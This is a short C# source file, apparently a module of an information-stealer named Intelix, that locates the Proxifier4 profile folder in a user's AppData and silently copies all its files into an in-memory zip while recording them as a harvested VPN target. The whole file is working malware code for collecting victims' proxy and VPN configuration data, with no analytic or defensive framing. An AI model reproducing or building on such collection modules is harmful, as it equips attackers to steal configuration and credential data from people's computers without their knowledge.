using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn;

public class Proxifier : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Proxifier4", "Profiles");
		if (Directory.Exists(text))
		{
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Proxifier";
			zip.AddDirectoryFiles(text, "Proxifier");
			counterApplications.Files.Add(text + " => Proxifier");
			counterApplications.Files.Add("Proxifier\\");
			counter.Vpns.Add(counterApplications);
		}
	}
}
